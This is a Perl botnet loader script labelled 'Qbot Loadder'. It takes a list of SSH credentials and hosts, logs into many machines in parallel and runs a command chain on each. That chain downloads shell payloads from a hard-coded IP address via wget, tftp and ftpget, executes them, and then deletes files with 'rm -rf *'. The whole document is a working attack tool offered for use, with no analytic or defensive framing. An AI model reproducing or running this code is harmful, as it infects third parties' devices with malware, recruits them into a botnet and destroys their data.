#!/usr/bin/perl
##Qbot Loadder
##Follow me @1strt on IG
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_);
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i <
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.161/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.161 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.161; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.161 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
                        print "\e[0;36m[1STRT]\e[32;1m[Bot Type]\e[0;36m[Perl] Connected: ".$newarray[$c]."\n";
                } else {
                        print "Server Connected\n";
                }
        } else {
                print "Scanning Done\n";
        }
	$pm->finish;
}
$pm->wait_all_children;
